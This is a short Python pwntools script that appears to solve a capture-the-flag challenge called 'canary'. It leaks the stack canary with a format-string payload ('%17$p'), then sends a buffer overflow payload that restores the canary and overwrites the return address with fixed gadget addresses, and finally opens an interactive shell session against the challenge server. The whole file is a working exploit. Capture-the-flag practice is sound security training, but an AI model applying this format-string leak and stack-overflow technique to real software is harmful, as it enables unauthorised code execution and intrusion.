from pwn import *
import sys


if sys.argv[1]=='remote':
    io = remote('shell.actf.co', '20701')
else:
    io = process('./canary')
    gdb.attach(io)

payload1= '%17$p'

io.sendlineafter('name? ',payload1)
io.recvuntil('Nice to meet you, ')
canary =io.recvuntil('00')
print(canary)


payload2='A'*56
payload2+= p64(int(canary,16))+'AAAAAAAA'
payload2+= p64(0x000000000040060e)
payload2+= p64(0x0000000000400787)
io.sendlineafter('me? ',payload2)

print(io.recvline())

io.interactive()
